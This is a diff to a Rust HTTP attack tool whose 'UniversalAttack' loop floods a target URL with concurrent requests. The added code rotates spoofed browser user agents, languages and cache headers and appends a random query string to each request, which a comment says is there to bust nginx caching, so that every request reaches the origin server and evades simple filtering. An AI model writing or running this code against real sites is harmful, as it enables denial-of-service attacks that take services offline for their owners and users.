@@ -15,6 +15,64 @@ use std::time::{Duration, Instant};
 use reqwest::Client;
 use tracing::info;
 
+// ── Randomization pools ───────────────────────────────────────────────────────
+static USER_AGENTS: &[&str] = &[
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+];
+
+static ACCEPT_LANGS: &[&str] = &[
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.9",
+    "de-DE,de;q=0.9,en;q=0.8",
+    "fr-FR,fr;q=0.9,en;q=0.8",
+    "es-ES,es;q=0.9,en;q=0.8",
+    "ja-JP,ja;q=0.9,en;q=0.8",
+    "zh-CN,zh;q=0.9,en;q=0.8",
+    "pt-BR,pt;q=0.9,en;q=0.8",
+    "ru-RU,ru;q=0.9,en;q=0.8",
+    "ko-KR,ko;q=0.9,en;q=0.8",
+];
+
+static CACHE_CONTROLS: &[&str] = &[
+    "no-cache",
+    "no-store",
+    "max-age=0",
+    "no-cache, no-store",
+    "must-revalidate",
+];
+
+/// Fast xorshift64 PRNG — no std dep, no mutex, thread-local
+fn xorshift(state: &mut u64) -> u64 {
+    *state ^= *state << 13;
+    *state ^= *state >> 7;
+    *state ^= *state << 17;
+    *state
+}
+
+fn rand_pick<'a, T>(slice: &'a [T], state: &mut u64) -> &'a T {
+    &slice[xorshift(state) as usize % slice.len()]
+}
+
+fn rand_hex(state: &mut u64, len: usize) -> String {
+    let mut s = String::with_capacity(len);
+    for _ in 0..len {
+        let c = xorshift(state) % 16;
+        s.push(char::from_digit(c as u32, 16).unwrap());
+    }
+    s
+}
+
 use phoenix_metrics::AttackMetrics;
 use crate::{Attack, AttackContext, AttackError, AttackResult};
 
@@ -119,14 +177,31 @@ impl Attack for UniversalAttack {
                             let mode    = mode.clone();
 
                             tasks.push(tokio::spawn(async move {
+                                // Per-task PRNG — unique seed per task
+                                let mut rng: u64 = std::time::SystemTime::now()
+                                    .duration_since(std::time::UNIX_EPOCH)
+                                    .unwrap_or_default()
+                                    .subsec_nanos() as u64;
+                                rng ^= rng.wrapping_mul(0x9e3779b97f4a7c15);
+
                                 while !stop_c.load(Ordering::Relaxed) {
+                                    // Randomize every request — busts nginx cache
+                                    let ua   = rand_pick(USER_AGENTS,    &mut rng);
+                                    let lang = rand_pick(ACCEPT_LANGS,   &mut rng);
+                                    let cc   = rand_pick(CACHE_CONTROLS, &mut rng);
+                                    let bust = rand_hex(&mut rng, 10);
+                                    let url  = format!("{}?v={}", target, bust);
+
                                     let t0 = Instant::now();
-                                    match client.get(&target).send().await {
+                                    match client.get(&url)
+                                        .header("user-agent",      *ua)
+                                        .header("accept-language", *lang)
+                                        .header("cache-control",   *cc)
+                                        .header("pragma",          "no-cache")
+                                        .header("accept",          "text/html,application/xhtml+xml,*/*;q=0.8")
+                                        .send().await {
                                         Ok(resp) => {
                                             let ok = resp.status().as_u16() < 400;
-                                            // MUST consume body to cleanly release HTTP/2 stream slot.
-                                            // drop(resp) without this leaves stream in zombie state,
-                                            // filling all 32 slots and blocking new requests.
                                             let _ = resp.bytes().await;
                                             let lat = t0.elapsed().as_micros() as u64;
                                             metrics.record_request(lat, ok, 0).await;
